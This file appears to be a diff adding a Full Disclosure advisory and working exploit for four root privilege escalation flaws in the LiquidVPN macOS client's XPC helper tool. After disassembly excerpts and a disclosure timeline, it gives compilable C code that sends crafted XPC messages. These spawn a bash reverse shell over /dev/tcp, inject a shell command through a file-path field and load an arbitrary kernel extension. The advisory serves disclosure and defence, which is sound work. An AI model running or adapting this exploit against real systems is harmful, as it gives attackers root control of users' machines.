@@ -1,0 +1,312 @@
+/*
+=======================================================================
+Title: Multiple Privilege Escalation Vulnerabilities
+Product: LiquidVPN for MacOS
+Vulnerable versions: 1.37, 1.36 and earlier
+CVE ID(s): CVE-2018-18856, CVE-2018-18857, CVE-2018-18858, CVE-2018-18859
+Impact: Critical
+Homepage: https://www.liquidvpn.com
+Identified: 2018-09-29
+By: Bernd Leitner (bernd.leitner [at] gmail dot com)
+=======================================================================
+
+Vendor description:
+-------------------
+"LiquidVPN creates a secure encrypted link between your device and the
+Internet.
+When you connect to the Internet from your home, mobile device, office or a
+WiFi
+hotspot with encryption your traffic can’t be monitored by 3rd parties like
+your
+ISP. Without encryption, your ISP can store information about the websites
+you
+use and sell that data to anyone willing to pay for it. Some ISPs even
+inject
+advertisements into web pages to further profit off of the Internet service
+you
+pay for."
+
+Source: https://www.liquidvpn.com
+
+
+Business recommendation:
+------------------------
+By exploiting the vulnerabilities documented in this advisory, an attacker
+can fully compromise a MacOS system with an installation of the LiquidVPN
+client.
+
+Users are urged to uninstall the application until the vendor ships a new
+version
+of the LiquidVPN client.
+
+
+Vulnerability overview/description:
+-----------------------------------
+LiquidVPN installs the helper tool "com.smr.liquidvpn.OVPNHelper" for
+performing
+privileged (root) actions. In order to allow other LiquidVPN components to
+send
+messages to the helper tool, it implements an XPC service. Static code
+analysis
+showed, that the XPC service does not filter incoming messages. This means,
+regular users (local attackers) can craft arbitrary XPC messages and send
+them
+to the service. This leads to the following issues:
+
+
+1) "anycmd" Privilege Escalation (reserved CVE-2018-18857)
+
+After receiving a message, the service checks for the existence of the
+"anycmd" parameter:
+
+============================================================================================
+...
+__text:00000001000012E8                 lea     rsi, aAnycmd    ; "anycmd"
+__text:00000001000012EF                 mov     rdi, r14        ; char *
+__text:00000001000012F2                 call    _strcmp
+__text:00000001000012F7                 test    eax, eax
+__text:00000001000012F9                 jnz     loc_1000016C2
+__text:00000001000012FF                 mov     [rbp+var_10A38], r15
+__text:0000000100001306                 lea     rsi, aCommandLine ;
+"command_line"
+__text:000000010000130D                 mov     rdi, rbx
+...
+__text:0000000100001336                 lea     rsi, aR         ; "r"
+__text:000000010000133D                 mov     rdi, r14        ; char *
+__text:0000000100001340                 call    _popen
+...
+============================================================================================
+
+If "anycmd" is found, the "command_line" parameter is extracted from the
+message
+and directly passed on to a call to popen() as an argument.
+
+
+2) "openvpncmd" Privilege Escalation (reserved CVE-2018-18856)
+
+Similar to the previous vulnerability, the service checks if the "openvpn"
+parameter exists. If it does, the "openvpncmd" parameter is extracted and
+passed
+on to a system() call as an argument:
+
+============================================================================================
+...
+__text:00000001000013F1                 lea     rsi, aOpenvpncmd ;
+"openvpncmd"
+__text:00000001000013F8                 mov     rdi, rbx
+__text:00000001000013FB                 call    _xpc_dictionary_get_string
+...
+__text:000000010000166A                 mov     rdi, r15        ; char *
+__text:000000010000166D                 call    _system
+__text:0000000100001672                 lea     rsi, aReply     ; "reply"
+__text:0000000100001679                 lea     rdx, aOpenvpnCommand ;
+"openvpn command executed (ver 3)"
+__text:0000000100001680                 mov     rdi, r12
+__text:0000000100001683                 call    _xpc_dictionary_set_string
+...
+============================================================================================
+
+3) OS Command Injection (reserved CVE-2018-18858)
+
+If the service detects the "openvpn" parameter in a message, it also checks
+if
+the parameters  "tun_path" or "tap_path" exist. If one of them (or both)
+are found,
+the values are used as source paths for a copy process using the system()
+function.
+However, the paths are not sanitized before being passed to system():
+
+============================================================================================
+...
+__text:00000001000013CD                 lea     rsi, aPathTun   ; "path_tun"
+__text:00000001000013D4                 mov     rdi, rbx
+__text:00000001000013D7                 call    _xpc_dictionary_get_string
+__text:00000001000013DC                 mov     r14, rax
+__text:00000001000013DF                 lea     rsi, aPathTap   ; "path_tap"
+__text:00000001000013E6                 mov     rdi, rbx
+__text:00000001000013E9                 call    _xpc_dictionary_get_string
+...
+__text:000000010000143F                 call    _strcat
+__text:0000000100001444                 mov     rdi, rbx        ; char *
+__text:0000000100001447                 call    _strlen
+...
+__text:0000000100001497                 mov     rdi, rbx        ; char *
+__text:000000010000149A                 call    _system
+..
+============================================================================================
+
+4) Loading of arbitrary Kernel Extensions (reserved CVE-2018-18859)
+
+The previous vulnerability can also be used to directly install an arbitrary
+kernel extension. When the client is installed, "tun_path" and "tap_path"
+are
+pointed to the application folder for installing
+"/Applications/LiquidVPN.app/Contents/Resources/tun.kext" and
+"/Applications/LiquidVPN.app/Contents/Resources/tap.kext".
+By crafting an XPC message containing attacker controlled kernel extension
+paths,
+the helper tool installs the kernel  extensions using a call to the system
+function
+kextload(). Note: Since MacOS 10.13, a Kext needs to be signed. In
+adddition to that,
+Apple introduced user-approval for installing third party kernel
+extensions. However,
+as an attacker has local access to the system and user-approval does not
+require the
+user to enter a root or admin password, this is not a problem.
+
+
+Proof of concept:
+-----------------
+The following proof of concepts can be used to execute arbitrary system
+commands:
+
+1) "anycmd" Privilege Escalation
+
+============================================================================================
+...
+xpc_dictionary_set_string(message, "cmd", "anycmd");
+xpc_dictionary_set_bool(message, "blocking", FALSE);
+xpc_dictionary_set_string(message, "command_line", "[ARBITRARY CMD]");
+...
+============================================================================================
+
+2) "openvpncmd" Privilege Escalation
+
+============================================================================================
+...
+xpc_dictionary_set_string(message, "cmd", "openvpn");
+xpc_dictionary_set_string(message, "openvpncmd", "[ARBITRARY CMD]");
+...
+============================================================================================
+
+3) OS Command Injection
+
+============================================================================================
+...
+xpc_dictionary_set_string(message, "cmd", "openvpn");
+xpc_dictionary_set_string(message, "path_tun", "/tmp/__dummy00_;[ARBITRARY
+CMD]");
+...
+============================================================================================
+
+4) Loading of arbitrary Kernel Extensions
+
+============================================================================================
+...
+xpc_dictionary_set_string(message, "cmd", "openvpn");
+xpc_dictionary_set_string(message, "path_tun", "[PATH TO KEXT]");
+...
+============================================================================================
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested and found to be vulnerable:
+1.37 (most recent) and 1.36.
+
+Earlier versions might be vulnerable as well.
+
+
+Vendor contact timeline:
+------------------------
+2018-10-04: Requested security contact via twitter @LiquidVPN
+2018-10-11: Contacted vendor through dave@liquidvpn.com
+2018-10-11: Sent PGP encrypted advisory (
+https://my.liquidvpn.com/canary/syswan)
+2018-10-17: Requested status update from vendor
+2018-10-30: Sent new contact details & public PGP key to dave@liquidvpn.com
+2018-10-30: Received vendor notification:
+            No patches will be issued as the LiquidVPN client for MacOS
+will be
+            replaced by new app in the future
+2018-10-31: Published to Full Disclosure Mailing List
+
+Solution:
+---------
+None.
+
+
+Workaround:
+-----------
+None.
+
+
+EOF B. Leitner / @2018
+*/
+
+// start netcat listener on port 9999
+
+#include <stdio.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <xpc/xpc.h>
+
+void what(const char *bin) {
+    printf("%s <1-4>\n", bin);
+    printf("[1] Privesc (local reverse shell on port 9999 via \"anycmd\")\n");
+    printf("[2] Privesc (local reverse shell on port 9999 via \"openvpncmd\")\n");
+    printf("[3] Privesc (local reverse shell on port 9999 via OS command injection)\n");
+    printf("[4] KEXT (load arbitrary kernel extension from /tmp/tun.kext (has to be signed for MacOS >= 10.13))\n");
+}
+ 
+int main(int argc, const char *argv[]) {
+
+    if (argc == 1 || argc > 2) {
+        what(argv[0]);
+        return 0;
+    }
+
+    int option = atoi(argv[1]);
+    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
+
+    switch(option) {
+        case 1:
+            // "anycmd"
+            xpc_dictionary_set_string(message, "cmd", "anycmd");
+            xpc_dictionary_set_bool(message, "blocking", FALSE);
+            xpc_dictionary_set_string(message, "command_line", "bash -i >& /dev/tcp/127.0.0.1/9999 0>&1");
+            break;
+        case 2:
+            // "openvpncmd"
+            xpc_dictionary_set_string(message, "cmd", "openvpn");
+            xpc_dictionary_set_string(message, "openvpncmd", "bash -i >& /dev/tcp/127.0.0.1/9999 0>&1");
+            break;
+        case 3:
+            // cmd injection via "path_tun". "path_tap" is affected by the same bug
+            mkdir("/tmp/__dummy00_", 0755);
+            xpc_dictionary_set_string(message, "cmd", "openvpn");
+            xpc_dictionary_set_string(message, "path_tun", "/tmp/__dummy00_;bash -i >& /dev/tcp/127.0.0.1/9999 0>&1;cat");
+            rmdir("/tmp/__dummy00_");
+            break;
+        case 4:
+            // load arbitrary kext via "path_tun". "path_tap" is affected by the same bug
+            xpc_dictionary_set_string(message, "cmd", "openvpn");
+            xpc_dictionary_set_string(message, "path_tun", "/tmp/tun.kext");
+            break;
+        default:
+            what(argv[0]);
+            return 0;
+    }
+
+    printf("[+] sending xpc message.\n");
+
+    xpc_connection_t connection = xpc_connection_create_mach_service("com.smr.liquidvpn.OVPNHelper", NULL, 0);
+    if (connection == NULL) {
+        printf("[-] connection to xpc service failed.\n");
+        return 1;
+    }
+
+    xpc_connection_set_event_handler(connection, ^(xpc_object_t e) {
+        // we don't need that here.
+    });
+
+    xpc_connection_resume(connection);
+
+    printf("[+] check your listener.\n");
+    xpc_object_t result = xpc_connection_send_message_with_reply_sync(connection, message);
+
+    printf("[+] bye.\n");
+
+    return 0;
+}
